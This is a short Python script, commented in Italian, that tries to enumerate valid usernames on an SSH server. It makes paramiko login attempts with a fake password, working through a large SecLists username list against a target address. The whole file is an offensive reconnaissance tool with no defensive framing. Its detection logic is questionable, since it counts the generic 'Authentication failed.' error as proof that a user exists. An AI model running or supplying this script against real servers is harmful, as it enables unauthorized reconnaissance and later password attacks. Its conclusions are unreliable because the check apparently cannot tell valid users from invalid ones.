import paramiko
import time

def check_user_ssh(host, port, username, timeout=5):
    """
    Testa se un utente esiste su un server SSH analizzando il comportamento del server.
    """
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(
            hostname=host,
            port=port,
            username=username,
            password="invalid_password",  # Password falsa per forzare l'errore
            banner_timeout=timeout,
            auth_timeout=timeout
        )
    except paramiko.AuthenticationException as e:
        if "Authentication failed." in str(e):
            # Risposta per un utente valido (credenziali errate)
            return True
        elif "No existing session" in str(e) or "invalid user" in str(e):
            # Risposta per un utente inesistente
            return False
    except Exception as e:
        print(f"Errore: {e}")
    finally:
        client.close()
    return False

def load_user_list(file_path):
    """
    Carica una lista di username da un file.
    """
    try:
        with open(file_path, "r") as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"Errore: File non trovato - {file_path}")
        return []
    except Exception as e:
        print(f"Errore nel caricamento del file: {e}")
        return []

def test_user_enumeration(host, port, user_list):
    """
    Testa una lista di utenti per vedere quali esistono sul server SSH.
    """
    valid_users = []
    for user in user_list:
        result = check_user_ssh(host, port, user)

        if result:
            print(f"Utente valido trovato: {user}")
            valid_users.append(user)
    return valid_users

if __name__ == "__main__":
    # Configura il server e la porta SSH
    ssh_host = "192.168.1.100"  # Modifica con l'IP o il dominio del target
    ssh_port = 22

    # Percorso al file con la lista di utenti
    user_list_file = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"

    print(f"Caricamento della lista di utenti da {user_list_file}...")
    user_list = load_user_list(user_list_file)

    if not user_list:
        print("Nessun utente caricato. Controlla il percorso del file e riprova.")
        exit()

    print(f"Inizio test di user enumeration su {ssh_host}:{ssh_port}")
    valid_users = test_user_enumeration(ssh_host, ssh_port, user_list)
    
    print("\nRisultati:")
    if valid_users:
        print("Utenti validi trovati:")
        for user in valid_users:
            print(f" - {user}")
    else:
        print("Nessun utente valido trovato.")

